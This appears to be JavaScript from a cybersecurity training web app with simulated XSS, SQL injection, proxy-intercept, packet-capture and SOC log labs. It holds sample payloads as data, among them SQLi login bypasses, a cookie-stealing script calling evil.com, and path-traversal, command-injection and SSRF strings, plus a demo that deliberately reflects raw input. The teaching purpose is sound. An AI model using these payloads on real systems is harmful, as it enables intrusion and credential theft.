        // Build a fresh srcdoc each time so payload is always injected fresh
        const safeSearchLabel = raw; // user-supplied, injected raw (that's the point!)
        const newDoc = `<html><head><style>body{font-family:Arial,sans-serif;padding:20px;background:#f8f8f8;}h3{color:#333;}input{width:80%;padding:6px;border:1px solid #ccc;border-radius:3px;}button{padding:6px 14px;background:#e74c3c;color:#fff;border:none;border-radius:3px;cursor:pointer;}.result-box{background:#fff;border:1px solid #ddd;padding:10px;border-radius:4px;margin-top:10px;}</style></head><body><h3>🛍️ VulnShop — Product Search</h3><div style="background:#fff;border:1px solid #ddd;padding:10px;border-radius:4px;"><input type='text' value="${raw.replace(/"/g,'&quot;')}" style='width:80%;padding:6px;border:1px solid #ccc;border-radius:3px;'> <button style='padding:6px 14px;background:#e74c3c;color:#fff;border:none;border-radius:3px;'>Search</button></div><div class='result-box'><p style='color:#777;font-size:13px;'>Showing results for: ${safeSearchLabel}</p></div></body></html>`;
        frame.srcdoc = newDoc;
        // Check if it looks like an XSS payload
        const isPayload = /<script|onerror|onload|javascript:|<svg|<iframe|<img/i.test(raw);
        resultEl.style.display = 'block';
        if (isPayload) {
          resultEl.dataset.state = 'danger';
          resultEl.innerHTML = '<strong>XSS Payload Detected!</strong> The application reflected your input without sanitization. In a real site, this would execute in every visitor\'s browser.';
        } else {
          resultEl.dataset.state = 'success';
          resultEl.innerHTML = 'Input reflected but <strong>no script injection detected</strong>. Try adding HTML tags like <code>&lt;script&gt;</code> or <code>onerror</code>.';
        }
      }

      if (injectBtn) injectBtn.addEventListener('click', injectPayload);
      if (payloadInput) payloadInput.addEventListener('keydown', e => { if (e.key === 'Enter') injectPayload(); });
      if (clearBtn) clearBtn.addEventListener('click', () => {
        if (payloadInput) payloadInput.value = '';
        resultEl.style.display = 'none';
        frame.srcdoc = "<html><body style='font-family:Arial,sans-serif;padding:20px;background:#f8f8f8;'><h3 style='color:#333;'>🛍️ VulnShop — Product Search</h3><div style='background:#fff;border:1px solid #ddd;padding:10px;border-radius:4px;'><input type='text' placeholder='Search products...' style='width:80%;padding:6px;border:1px solid #ccc;border-radius:3px;'> <button style='padding:6px 14px;background:#e74c3c;color:#fff;border:none;border-radius:3px;cursor:pointer;'>Search</button></div><p style='color:#777;font-size:13px;margin-top:10px;'>Showing results for: <span id='search-result'>(nothing yet)</span></p></body></html>";
      });
    }, 100);
  }

  // ── Burp Suite Interceptor Practice ─────────────────────────────────────────
  if (mod.id === 'burp-proxy') {
    const burpLabHtml = `
      <div class="section-card fade-in fade-in-delay-6" id="burpLabSection">
        <div class="section-header">
          <div class="section-icon concept">${LI.shield}</div>
          <h3 class="section-title">Proxy Intercept Practice Lab</h3>
        </div>
        <div class="section-body">
          <p>Practice intercepting and modifying HTTP requests in this built-in simulator. Fill in the login form below and click Submit — the request is intercepted and shown beside the form. Modify the payload and forward it to see the result.</p>
          <div class="sim-grid-2">
            <!-- Simulated Login Page -->
            <div class="sim-panel">
              <div class="sim-panel-bar">
                <div class="sim-dots"><span class="terminal-dot red"></span><span class="terminal-dot yellow"></span><span class="terminal-dot green"></span></div>
                <span>http://simulated-target.local/login</span>
              </div>
              <div class="sim-panel-body">
                <h4>Login</h4>
                <input type="email" id="burpLabEmail" class="sim-field" value="user@company.com">
                <input type="password" id="burpLabPass" class="sim-field" value="mypassword">
                <button id="burpLabSubmit" class="btn btn-primary">Submit (Intercept ON)</button>
              </div>
            </div>
            <!-- Intercepted Request Display -->
            <div class="sim-stack">
              <div class="sim-label">intercepted request</div>
              <textarea id="burpLabIntercepted" class="sim-field" rows="8" spellcheck="false">— Submit the form to intercept a request —</textarea>
              <div class="sim-row">
                <button id="burpLabForward" class="btn btn-secondary is-fill">▶ Forward</button>
                <button id="burpLabDrop" class="btn btn-danger is-fill">✕ Drop</button>
              </div>
              <div id="burpLabResponse" class="sim-result is-mono" style="display:none;"></div>
            </div>
          </div>
          <div class="sim-tip">
            <strong>Try it:</strong> After intercepting, change the email to <code>admin@company.com'--</code> and click Forward. This simulates SQL Injection via Burp!
          </div>
        </div>
      </div>
    `;
    const challengesSection = document.getElementById('interactiveChallengesSection');
    if (challengesSection) {
      challengesSection.style.display = 'block';
      challengesSection.insertAdjacentHTML('afterend', burpLabHtml);
    } else {
      document.getElementById('contentArea').insertAdjacentHTML('beforeend', burpLabHtml);
    }
    setTimeout(() => {
      const submitBtn = document.getElementById('burpLabSubmit');
      const emailIn = document.getElementById('burpLabEmail');
      const passIn = document.getElementById('burpLabPass');
      const interceptedArea = document.getElementById('burpLabIntercepted');
      const forwardBtn = document.getElementById('burpLabForward');
      const dropBtn = document.getElementById('burpLabDrop');
      const responseEl = document.getElementById('burpLabResponse');

      if (submitBtn) submitBtn.addEventListener('click', () => {
        const email = emailIn ? emailIn.value : 'user@company.com';
        const pass = passIn ? passIn.value : 'mypassword';
        const raw = `POST /rest/user/login HTTP/1.1\nHost: simulated-target.local\nContent-Type: application/json\nContent-Length: ${JSON.stringify({email,password:pass}).length}\nUser-Agent: Mozilla/5.0 (Windows NT 10.0)\nCookie: token=abc123xyz\n\n${JSON.stringify({email, password: pass}, null, 2)}`;
        if (interceptedArea) interceptedArea.value = raw;
        if (responseEl) responseEl.style.display = 'none';
        submitBtn.textContent = 'Request Intercepted!';
        submitBtn.classList.add('is-intercepted');
        setTimeout(() => { submitBtn.textContent = 'Submit (Intercept ON)'; submitBtn.classList.remove('is-intercepted'); }, 3000);
      });

      if (forwardBtn) forwardBtn.addEventListener('click', () => {
        const req = interceptedArea ? interceptedArea.value : '';
        const isSQLi = /['"-]{1,2}(--|#|;|or\s+1=1|union\s+select)/i.test(req);
        const isAdminEmail = /admin@/i.test(req);
        const priceMatch = req.match(/"price"\s*:\s*(-?\d+(?:\.\d+)?)/i);
        const isPriceTamper = priceMatch && parseFloat(priceMatch[1]) <= 0;
        const isXff = /^x-forwarded-for\s*:\s*127\.0\.0\.1\s*$/im.test(req);
        responseEl.style.display = 'block';
        if (isPriceTamper || isXff) {
          responseEl.dataset.state = 'danger';
          responseEl.innerHTML = isPriceTamper
            ? '<strong>HTTP/1.1 200 OK</strong><br>{ "order": "confirmed", "charged": ' + escapeHtml(priceMatch[1]) + ' }<br><br><em>The server trusted the client-supplied price.</em>'
            : '<strong>HTTP/1.1 200 OK</strong><br>{ "access": "granted", "ip_seen": "127.0.0.1" }<br><br><em>The server trusted the spoofed X-Forwarded-For header.</em>';
        } else if (isSQLi || isAdminEmail) {
          responseEl.dataset.state = 'danger';
          responseEl.innerHTML = '<strong>HTTP/1.1 200 OK</strong><br>{ "authentication": { "token": "eyJhbGciOiJSUzI1NiJ9...", "umail": "admin@company.com" } }<br><br><em>SQLi payload or admin account bypass accepted! You\'re in as admin.</em>';
        } else {
          responseEl.dataset.state = 'success';
          responseEl.innerHTML = '<strong>HTTP/1.1 401 Unauthorized</strong><br>{ "error": "Invalid email or password" }<br><br>Request forwarded normally. Try modifying the email with a SQLi payload!';
        }
      });

      if (dropBtn) dropBtn.addEventListener('click', () => {
        if (interceptedArea) interceptedArea.value = '— Request dropped. Submit again to intercept —';
        if (responseEl) responseEl.style.display = 'none';
      });
    }, 100);
  }

  // ── SQL Injection Practice Terminal ─────────────────────────────────────────
  if (mod.id === 'sqli') {
    const sqliLabHtml = `
      <div class="section-card fade-in fade-in-delay-6" id="sqliLabSection">
        <div class="section-header">
          <div class="section-icon concept">${LI.target}</div>
          <h3 class="section-title">SQLi Practice Lab</h3>
        </div>
        <div class="section-body">
          <p>Test SQL injection payloads against a simulated login form. This lab works <strong>instantly</strong> — no lab setup needed. Observe how different payloads bypass or fail authentication.</p>
          <div class="sim-grid-2">
            <div class="sim-panel">
              <div class="sim-panel-bar">
                <span>SELECT * FROM users WHERE email='?' AND password='?'</span>
              </div>
              <div class="sim-panel-body">
                <div>
                  <label class="sim-label" for="sqliEmail">email / username</label>
                  <input type="text" id="sqliEmail" class="sim-field" value="' OR 1=1--">
                </div>
                <div>
                  <label class="sim-label" for="sqliPass">password</label>
                  <input type="text" id="sqliPass" class="sim-field" value="anything">
                </div>
                <button id="sqliSubmit" class="btn btn-primary">Submit Injection</button>
              </div>
            </div>
            <div class="sim-stack">
              <div class="sim-label">server response</div>
              <div id="sqliResponse" class="sim-out is-grow">Submit a payload to see the server's response...</div>
              <div class="sim-label">generated sql</div>
              <div id="sqliGeneratedSQL" class="sim-out is-code">SELECT * FROM users WHERE email='?' AND password='?'</div>
            </div>
          </div>
          <div class="sim-out sim-block">
            <div class="sim-label">common payloads — click to load</div>
            <div class="sim-chips">
              <button class="sqli-payload-btn sim-chip" data-email="' OR 1=1--" data-pass="anything">' OR 1=1--</button>
              <button class="sqli-payload-btn sim-chip" data-email="admin@site.com'--" data-pass="anything">admin'--</button>
              <button class="sqli-payload-btn sim-chip" data-email="' UNION SELECT 1,username,password FROM users--" data-pass="x">UNION SELECT</button>
              <button class="sqli-payload-btn sim-chip" data-email="' OR 'a'='a" data-pass="' OR 'a'='a">'OR'a'='a</button>
              <button class="sqli-payload-btn sim-chip is-safe" data-email="normal@user.com" data-pass="correctpassword">Valid Login</button>
            </div>
          </div>

          <div class="sim-grid-2">
            <div class="sim-step">
              <h4>Step 1: Authentication Bypass</h4>
              <p><strong>Goal:</strong> Log in without knowing the password.</p>
              <ul>
                <li>Click the <code>' OR 1=1--</code> payload button above.</li>
                <li>Click <strong>Submit Injection</strong>.</li>
              </ul>
              <div class="sim-why">
                <strong>Why it works:</strong> The database evaluates <code>1=1</code> as TRUE, and the <code>--</code> comments out the password check!
              </div>
            </div>

            <div class="sim-step">
              <h4>Step 2: UNION Data Extraction</h4>
              <p><strong>Goal:</strong> Steal hidden data from the database.</p>
              <ul>
                <li>Click the <code>UNION SELECT</code> payload button above.</li>
                <li>Click <strong>Submit Injection</strong>.</li>
              </ul>
              <div class="sim-why">
                <strong>Why it works:</strong> This appends a second query result to the first, pulling sensitive user data right into the server response.
              </div>
            </div>
          </div>
        </div>
      </div>
    `;
    const challengesSection = document.getElementById('interactiveChallengesSection');
    if (challengesSection) {
      challengesSection.style.display = 'block';
      challengesSection.insertAdjacentHTML('afterend', sqliLabHtml);
    } else {
      document.getElementById('contentArea').insertAdjacentHTML('beforeend', sqliLabHtml);
    }
    setTimeout(() => {
      const emailIn = document.getElementById('sqliEmail');
      const passIn = document.getElementById('sqliPass');
      const submitBtn = document.getElementById('sqliSubmit');
      const responseEl = document.getElementById('sqliResponse');
      const sqlEl = document.getElementById('sqliGeneratedSQL');

      document.querySelectorAll('.sqli-payload-btn').forEach(btn => {
        btn.addEventListener('click', () => {
          if (emailIn) emailIn.value = btn.dataset.email;
          if (passIn) passIn.value = btn.dataset.pass;
        });
      });

      function evalSQLi() {
        const email = emailIn ? emailIn.value : '';
        const pass = passIn ? passIn.value : '';
        const generatedSQL = `SELECT * FROM users WHERE email='${email}' AND password='${pass}'`;
        if (sqlEl) sqlEl.textContent = generatedSQL;

        const result = classifySqliAttempt(email, pass);
        if (result.state) responseEl.dataset.state = result.state; else delete responseEl.dataset.state;
        responseEl.innerHTML = result.html;
      }

      if (submitBtn) submitBtn.addEventListener('click', evalSQLi);
      if (emailIn) emailIn.addEventListener('keydown', e => { if (e.key === 'Enter') evalSQLi(); });
      if (passIn) passIn.addEventListener('keydown', e => { if (e.key === 'Enter') evalSQLi(); });
    }, 100);
  }

  // ── Network Traffic Analyst Simulator ───────────────────────────────────────
  if (mod.id === 'net-analyst') {
    const packetLabHtml = `
      <div class="section-card fade-in fade-in-delay-6" id="packetLabSection">
        <div class="section-header">
          <div class="section-icon concept">${LI.signal}</div>
          <h3 class="section-title">Live Packet Capture Simulator</h3>
        </div>
        <div class="section-body">
          <p>Analyze a simulated packet stream. Use the filter bar to isolate suspicious traffic. Click any packet to inspect it. <strong>Find the malicious beacon hidden in the traffic!</strong></p>
          <div class="sim-row sim-block">
            <input type="text" id="packetFilter" class="sim-field" placeholder="Display filter (e.g.: http, dns, ip.dst==13.37.13.37, tcp.dstport==4444)">
            <button id="packetFilterBtn" class="btn btn-secondary">Apply</button>
            <button id="packetClearFilter" class="btn btn-secondary">Clear</button>
            <button id="packetStartCapture" class="btn btn-primary">▶ Start Capture</button>
          </div>
          <div class="pkt-frame">
            <div class="pkt-head">
              <span>no.</span><span>time</span><span>source</span><span>destination</span><span>protocol</span><span>length</span>
            </div>
            <div id="packetList" class="pkt-list"></div>
          </div>
          <div class="sim-grid-2">
            <div>
              <div class="sim-label">packet detail</div>
              <div id="packetDetail" class="sim-out pkt-out pkt-detail">Click a packet to inspect it...</div>
            </div>
            <div>
              <div class="sim-label">analysis result</div>
              <div id="packetAnalysis" class="sim-out pkt-out">Select a suspicious packet to trigger analysis...</div>
            </div>
          </div>
        </div>
      </div>
    `;
    const challengesSection = document.getElementById('interactiveChallengesSection');
    if (challengesSection) {
      challengesSection.style.display = 'block';
      challengesSection.insertAdjacentHTML('afterend', packetLabHtml);
    } else {
      document.getElementById('contentArea').insertAdjacentHTML('beforeend', packetLabHtml);
    }
    setTimeout(() => window.__app.initPacketLab(), 100);
  }

  // Setup copy buttons
  attachCopyHandlers();
  contentArea.scrollTop = 0;
  window.CCMotion && window.CCMotion.openModule(contentArea, 'open ' + mod.id);
}

/* ═══════════════════════════════════════════════════════════════════════════════
   CODE BLOCK & COPY
   ═══════════════════════════════════════════════════════════════════════════════ */

function buildCodeBlock(lang, text) {
  const id = 'cb-' + Math.random().toString(36).substr(2, 8);
  return `
    <div class="code-wrapper">
      <div class="code-header">
        <span class="code-lang">${lang}</span>
        <button class="btn-copy" data-target="${id}" title="Copy to clipboard">
          ${ICONS.copy}
          <span>Copy</span>
        </button>
      </div>
      <pre class="code-block" id="${id}">${escapeHtml(text)}</pre>
    </div>
  `;
}

function attachCopyHandlers() {
  document.querySelectorAll('.btn-copy[data-target]').forEach(btn => {
    btn.addEventListener('click', async () => {
      const el = document.getElementById(btn.dataset.target);
      if (el) await copyToClipboard(el.textContent, btn);
    });
  });
  document.querySelectorAll('.cell-copy-btn[data-copy]').forEach(btn => {
    btn.addEventListener('click', async () => {
      await copyToClipboard(btn.dataset.copy, btn);
    });
  });
}

async function writeClipboard(text) {
  try {
    if (navigator.clipboard && navigator.clipboard.writeText) {
      await navigator.clipboard.writeText(text);
      return true;
    }
  } catch (e) { /* fall through to execCommand */ }
  try {
    const ta = document.createElement('textarea');
    ta.value = text;
    ta.style.position = 'fixed';
    ta.style.opacity = '0';
    document.body.appendChild(ta);
    ta.select();
    const ok = document.execCommand('copy');
    ta.remove();
    return ok;
  } catch (e) { return false; }
}

async function copyToClipboard(text, btnEl) {
  // Ignore clicks while the button is already showing its "copied" state,
  // otherwise the restore timer captures the wrong original markup.
  if (btnEl.dataset.copying === '1') return;
  const ok = await writeClipboard(text);
  if (!ok) { console.error('Copy failed'); return; }

  btnEl.dataset.copying = '1';
  const orig = btnEl.dataset.origHtml || btnEl.innerHTML;
  btnEl.dataset.origHtml = orig;
  btnEl.classList.add('copied');
  window.CCMotion && window.CCMotion.flash(btnEl);
  btnEl.innerHTML = btnEl.classList.contains('btn-copy')
    ? `${ICONS.check}<span>Copied!</span>`
    : ICONS.check;
  setTimeout(() => {
    btnEl.classList.remove('copied');
    btnEl.innerHTML = btnEl.dataset.origHtml;
    delete btnEl.dataset.copying;
    delete btnEl.dataset.origHtml;
  }, 1800);
}

function startTutorial(tutorialKey) {
  if (!window.TUTORIALS || !window.TUTORIALS[tutorialKey]) {
    alert("Tutorial not found!");
    return;
  }
  
  const tut = window.TUTORIALS[tutorialKey];
  
  // ── Standalone Lab Launchers ──────────────────────────────────────────────
  if (tut.requiresBurpLab) {
    if (window.labAPI && window.labAPI.openBurpLab) window.labAPI.openBurpLab();
    return;
  }
  if (tut.requiresPriceTampering) {
    if (window.labAPI && window.labAPI.openPriceTamperingLab) window.labAPI.openPriceTamperingLab();
    return;
  }
  if (tut.requiresCookieManipulation) {
    if (window.labAPI && window.labAPI.openCookieManipulationLab) window.labAPI.openCookieManipulationLab();
    return;
  }
  if (tut.requiresHeaderManipulation) {
    if (window.labAPI && window.labAPI.openHeaderManipulationLab) window.labAPI.openHeaderManipulationLab();
    return;
  }
  if (tut.requiresSQLiLab) {
    if (window.labAPI && window.labAPI.openSQLiLab) window.labAPI.openSQLiLab();
    return;
  }

  if (!tut.steps || !Array.isArray(tut.steps) || tut.steps.length === 0) {
    return;
  }

  // Auto-scroll to integrated simulator section if available
  setTimeout(() => {
    const SECTION_IDS = { 'burp-proxy': 'burpLabSection', 'net-analyst': 'packetLabSection' };
    const simSec = document.getElementById(SECTION_IDS[tut.module] || '') ||
                   document.getElementById(tut.module + 'LabSection') || 
                   document.getElementById(tut.module + 'TerminalSection') ||
                   document.getElementById(tut.module + 'Section');
    if (simSec) {
      simSec.scrollIntoView({ behavior: 'smooth', block: 'start' });
    }
  }, 100);
  
  // Injected into the app document; every token carries its palette value as a fallback.
  const tutorialCSS = `
    #cyber-tut-backdrop {
      position: fixed; top: 0; left: 0; width: 100vw; height: 100vh;
      background: rgba(0, 0, 0, 0.65); z-index: 999990;
      pointer-events: none;
      /* The cut-out (clip-path) jumps to the next target; animating a polygon
         clip repaints the whole viewport every frame. */
      display: block;
    }
    #cyber-tut-bubble {
      position: fixed; z-index: 999999;
      background: var(--bg-surface, #0e1311);
      border: 1px solid var(--border-accent, rgba(95, 214, 140, 0.28));
      border-radius: 8px; padding: 16px 18px;
      color: var(--text-primary, #e6e9e4); font-family: 'IBM Plex Sans', 'Segoe UI', sans-serif;
      font-size: 14px;
      box-shadow: 0 12px 32px rgba(0, 0, 0, 0.55);
      max-width: 340px; min-width: 240px;
      pointer-events: auto;
    }
    #cyber-tut-bubble .tut-step-badge {
      display: block; font-family: 'JetBrains Mono', Consolas, monospace;
      font-weight: 500; font-size: 11px; letter-spacing: 0.04em; text-transform: lowercase;
      color: var(--accent, #5fd68c);
      margin-bottom: 8px;
    }
    #cyber-tut-bubble .tut-text {
      line-height: 1.6; font-size: 14px; color: var(--text-secondary, #a6b0a9);
    }
    #cyber-tut-bubble .tut-skip-btn {
      margin-top: 14px; display: flex; gap: 8px;
    }
    #cyber-tut-bubble .tut-btn {
      flex: 1; padding: 7px 12px; border-radius: 4px; cursor: pointer;
      font-family: 'JetBrains Mono', Consolas, monospace;
      font-size: 12px; font-weight: 500; text-align: center; border: 1px solid transparent;
    }
    #cyber-tut-bubble .tut-btn-primary {
      background: var(--accent, #5fd68c); border-color: var(--accent, #5fd68c); color: var(--on-accent, #07090a); font-weight: 700;
    }
    #cyber-tut-bubble .tut-btn-primary:hover { background: var(--accent-hover, #80e3a5); border-color: var(--accent-hover, #80e3a5); }
    #cyber-tut-bubble .tut-btn-secondary {
      background: transparent; border-color: var(--border, rgba(230, 233, 228, 0.08)); color: var(--text-secondary, #a6b0a9);
    }
    #cyber-tut-bubble .tut-btn-secondary:hover { background: var(--bg-hover, #1b2420); color: var(--text-primary, #e6e9e4); }
    .cyber-tut-highlight {
      position: relative !important; z-index: 999995 !important;
      box-shadow: 0 0 0 2px var(--amber, #ffb000) !important;
      border-radius: 4px;
    }
    #cyber-tut-arrow {
      position: fixed; z-index: 999998;
      width: 0; height: 0; pointer-events: none;
    }
    @media (prefers-reduced-motion: reduce) {
      html { scroll-behavior: auto !important; }
      #cyber-tut-backdrop, #cyber-tut-bubble, #cyber-tut-bubble *, #cyber-tut-arrow, .cyber-tut-highlight {
        animation: none !important; transition: none !important;
      }
    }
  `;
  
  // Double-encode steps: JSON.stringify twice produces a safe JS string literal
  // (no backticks can escape the template literal), then JSON.parse inside the
  // injected code decodes it back to the original array.
  const safeStepsLiteral = JSON.stringify(JSON.stringify(tut.steps));

  const tutorialEngineCode = `
(function() {
  if (window.__cyberTutorialEngine) {
    window.__cyberTutorialEngine.play(JSON.parse(${safeStepsLiteral}));
    return;
  }

  var backdrop = document.createElement('div');
  backdrop.id = 'cyber-tut-backdrop';
  document.body.appendChild(backdrop);

  var bubble = document.createElement('div');
  bubble.id = 'cyber-tut-bubble';
  bubble.style.display = 'none';
  document.body.appendChild(bubble);

  var engine = {
    steps: [],
    current: 0,
    retryCount: 0,
    maxRetries: 40,
    active: false,

    cleanupListeners: function() {
      if (this._cleanup) { try { this._cleanup(); } catch (e) {} this._cleanup = null; }
    },

    play: function(steps) {
      this.cleanupListeners();
      this.steps = steps;
      this.current = 0;
      this.active = true;
      this.retryCount = 0;
      backdrop.style.display = 'block';
      this.showStep();
    },

    stop: function() {
      this.active = false;
      this.cleanupListeners();
      backdrop.style.display = 'none';
      bubble.style.display = 'none';
      this.clearHighlight();
    },

    clearHighlight: function() {
      var els = document.querySelectorAll('.cyber-tut-highlight');
      for (var i = 0; i < els.length; i++) {
        els[i].classList.remove('cyber-tut-highlight');
      }
      backdrop.style.clipPath = 'none';
    },

    showStep: function() { var self = this;
      if (this.current >= this.steps.length) {
        bubble.innerHTML = '<div class="tut-step-badge">Tutorial Complete!</div>' +
          '<div class="tut-text">Congratulations! You have completed the tutorial.</div>' +
          '<div class="tut-skip-btn"><button class="tut-btn tut-btn-primary" id="tut-done-btn">Done</button></div>';
        bubble.style.display = 'block';
        bubble.style.top = '50%';
        bubble.style.left = '50%';
        bubble.style.transform = 'translate(-50%, -50%)';
        document.getElementById('tut-done-btn').onclick = function() { self.stop(); };
        return;
      }

      var step = this.steps[this.current];
      this.clearHighlight();

      var target = null;
      if (step.selector === 'body') {
        target = document.body;
      } else {
        target = document.querySelector(step.selector);
      }

      if (!target) {
        this.retryCount++;
        if (this.retryCount < this.maxRetries) {
          setTimeout(function() { if (self.active) self.showStep(); }, 500);
        } else {
          this.retryCount = 0;
          this.current++;
          this.showStep();
        }
        return;
      }
      this.retryCount = 0;

      if (target !== document.body) {
        target.classList.add('cyber-tut-highlight');
        target.scrollIntoView({ behavior: 'smooth', block: 'center' });

        setTimeout(function() {
          var rect = target.getBoundingClientRect();
          var pad = 6;
          var top = rect.top - pad;
          var left = rect.left - pad;
          var right = rect.right + pad;
          var bottom = rect.bottom + pad;
          
          backdrop.style.clipPath = 'polygon(' +
            '0% 0%, 0% 100%, ' +
            left + 'px 100%, ' +
            left + 'px ' + top + 'px, ' +
            right + 'px ' + top + 'px, ' +
            right + 'px ' + bottom + 'px, ' +
            left + 'px ' + bottom + 'px, ' +
            left + 'px 100%, ' +
            '100% 100%, 100% 0%)';
        }, 100);
      } else {
        backdrop.style.clipPath = 'none';
      }

      // Render bubble content
      bubble.style.transform = 'none';
      bubble.innerHTML =
        '<div class="tut-step-badge">Step ' + (this.current + 1) + ' of ' + this.steps.length + '</div>' +
        '<div class="tut-text">' + step.text + '</div>' +
        '<div class="tut-skip-btn">' +
          '<button class="tut-btn tut-btn-secondary" id="tut-skip-btn">Skip</button>' +
          '<button class="tut-btn tut-btn-primary" id="tut-next-btn">Next</button>' +
        '</div>';
      bubble.style.display = 'block';

      document.getElementById('tut-skip-btn').onclick = function() { self.stop(); };
      document.getElementById('tut-next-btn').onclick = function() { self.advance(); };

      // Position the bubble near the target
      setTimeout(function() {
        var tRect = target.getBoundingClientRect();
        var bRect = bubble.getBoundingClientRect();

        var tTop = tRect.top;
        var tBottom = tRect.bottom;
        var tLeft = tRect.left;
        var tRight = tRect.right;

        var bTop, bLeft;
        var pos = step.position || 'bottom';

        if (target === document.body || pos === 'center') {
          bTop = window.innerHeight / 2 - bRect.height / 2;
          bLeft = window.innerWidth / 2 - bRect.width / 2;
        } else if (pos === 'right') {
          bTop = tTop;
          bLeft = tRight + 14;
        } else if (pos === 'left') {
          bTop = tTop;
          bLeft = tLeft - bRect.width - 14;
        } else if (pos === 'top') {
          bTop = tTop - bRect.height - 14;
          bLeft = tLeft;
        } else {
          // bottom (default)
          bTop = tBottom + 14;
          bLeft = tLeft;
        }

        // Clamp to viewport
        if (bLeft + bRect.width > window.innerWidth - 10) bLeft = window.innerWidth - bRect.width - 10;
        if (bTop + bRect.height > window.innerHeight - 10) bTop = tTop - bRect.height - 14;
        if (bLeft < 10) bLeft = 10;
        if (bTop < 10) bTop = 10;

        bubble.style.top = bTop + 'px';
        bubble.style.left = bLeft + 'px';
      }, 150);

      // Also listen for user performing the action to auto-advance
      if (step.action === 'click' && target !== document.body) {
        var clickHandler = function() {
          target.removeEventListener('click', clickHandler);
          self.advance();
        };
        target.addEventListener('click', clickHandler);
        this._cleanup = function() { target.removeEventListener('click', clickHandler); };
      } else if (step.action === 'input' && target !== document.body) {
        var inputHandler = function() {
          var val = (target.value || '').trim();
          var want = String(step.waitForValue || '').trim();
          var matched = target.tagName === 'TEXTAREA' ? val.indexOf(want) !== -1 : val === want;
          if (want && matched) {
            target.removeEventListener('input', inputHandler);
            self.advance();
          }
        };
        target.addEventListener('input', inputHandler);
        this._cleanup = function() { target.removeEventListener('input', inputHandler); };
      } else if (step.action === 'enter' && target !== document.body) {
        var keydownHandler = function(e) {
          if (e.key === 'Enter') {
            target.removeEventListener('keydown', keydownHandler);
            // Give a tiny delay so the actual enter command triggers first
            setTimeout(function() { self.advance(); }, 50);
          }
        };
        target.addEventListener('keydown', keydownHandler);
        this._cleanup = function() { target.removeEventListener('keydown', keydownHandler); };
      }
    },

    advance: function() {
      if (!this.active) return;
      this.cleanupListeners();
      this.current++;
      this.retryCount = 0;
      this.showStep();
    }
  };

  window.__cyberTutorialEngine = engine;
  engine.play(JSON.parse(${safeStepsLiteral}));
})();
`;

  if (!document.getElementById('cyber-tut-styles')) {
    const styleEl = document.createElement('style');
    styleEl.id = 'cyber-tut-styles';
    styleEl.textContent = tutorialCSS;
    document.head.appendChild(styleEl);
  }
  const scriptEl = document.createElement('script');
  scriptEl.textContent = tutorialEngineCode;
  document.body.appendChild(scriptEl);
  scriptEl.remove();
}

/* ═══════════════════════════════════════════════════════════════════════════════
   SOC SIMULATOR LOGIC
   ═══════════════════════════════════════════════════════════════════════════════ */

let socStreamInterval = null;
let socFlaggedScenario = null; // scenario of the log entry the analyst flagged
let socLogs = [];

let currentSocScenario = 'sqli';
let originalRemediationHTML = '';

function startSocSimulator() {
  // Hide normal content
  document.getElementById('contentArea').style.display = 'none';
  document.getElementById('socMode').style.display = 'flex';
  
  const selectEl = document.getElementById('socScenarioSelect');
  if (selectEl) {
    currentSocScenario = selectEl.value;
  }
  
  // Save original HTML for resume
  const panel = document.getElementById('remediationPanel');
  if (panel && !originalRemediationHTML) {
    originalRemediationHTML = panel.innerHTML;
  }
  if (panel) {
    panel.classList.add('locked');
  }

  // Reset terminal
  const terminal = document.getElementById('socTerminal');
  terminal.innerHTML = '';
  socLogs = [];
  socFlaggedScenario = null;

  if (socStreamInterval) clearInterval(socStreamInterval);
  
  // Normal log generators
  function getRandomIp() {
    return Math.floor(Math.random() * 255) + '.' + Math.floor(Math.random() * 255) + '.' + Math.floor(Math.random() * 255) + '.' + Math.floor(Math.random() * 255);
  }
  const paths = [
    '/images/logo.png', '/css/main.css', '/api/products', '/#/', '/api/session',
    '/js/app.js', '/favicon.ico', '/api/orders', '/assets/images/banner.png',
    '/rest/products/search', '/socket.io/?EIO=3&transport=websocket'
  ];
  const statuses = ['200', '200', '200', '304', '404', '401', '302', '201'];
  
  let lineCount = 0;
  
  socStreamInterval = setInterval(() => {
    lineCount++;
    const ip = getRandomIp();
    const method = Math.random() > 0.8 ? 'POST' : 'GET';
    const path = paths[Math.floor(Math.random() * paths.length)];
    const status = statuses[Math.floor(Math.random() * statuses.length)];
    const time = new Date().toISOString().split('T')[1].substring(0,8);
    
    let isMalicious = false;
    let actualIp = ip;
    let actualMethod = method;
    let actualPath = path;
    let actualStatus = status;
    
    // Pick actual scenario if random
    let activeScenario = currentSocScenario;
    if (activeScenario === 'random' || !activeScenario) {
      const allScenarios = ['sqli', 'xss', 'brute', 'path', 'cmdi', 'idor', 'ssrf'];
      activeScenario = allScenarios[Math.floor(Math.random() * allScenarios.length)];
    }
    
    if (lineCount % 17 === 0) {
      isMalicious = true;
      actualIp = '13.37.13.37';
      
      if (activeScenario === 'sqli') {
        actualMethod = 'GET';
        actualPath = '/api/users?id=1+UNION+SELECT+*+FROM+passwords--';
        actualStatus = '500';
      } else if (activeScenario === 'xss') {
        actualMethod = 'GET';
        actualPath = '/search?q=<script>fetch("http://evil.com?c="+document.cookie)</script>';
        actualStatus = '200';
      } else if (activeScenario === 'brute') {
        actualMethod = 'POST';
        actualPath = '/api/login';
        actualStatus = '200';
      } else if (activeScenario === 'path') {
        actualMethod = 'GET';
        actualPath = '/ftp/../../../etc/passwd';
        actualStatus = '200';
      } else if (activeScenario === 'cmdi') {
        actualMethod = 'POST';
        actualPath = '/api/ping?host=127.0.0.1;cat+/etc/shadow';
        actualStatus = '200';
      } else if (activeScenario === 'idor') {
        actualMethod = 'GET';
        actualPath = '/rest/basket/5 (where 5 != user.id)';
        actualStatus = '200';
      } else if (activeScenario === 'ssrf') {
        actualMethod = 'POST';
        actualPath = '/api/webhook?url=http://169.254.169.254/latest/meta-data/';
        actualStatus = '200';
      }
    } else if (activeScenario === 'brute' && lineCount % 5 === 0) {
      // Background noise for brute force
      actualIp = '13.37.13.37';
      actualMethod = 'POST';
      actualPath = '/api/login';
      actualStatus = '401';
    }
    
    const lineId = 'log-' + lineCount;
    const logLine = document.createElement('div');
    logLine.className = 'terminal-line';
    logLine.id = lineId;
    
    const escapedPath = escapeHtml(actualPath);
    logLine.innerHTML = `<span class="timestamp">[${time}]</span> <span class="ip">${actualIp}</span> <span class="method">${actualMethod}</span> ${escapedPath} HTTP/1.1" <span class="log-status${actualStatus === '500' || actualStatus === '401' ? ' is-error' : ''}">${actualStatus}</span>`;
    
    const lineScenario = isMalicious ? activeScenario : null;

    logLine.onclick = () => {
      // Deselect all
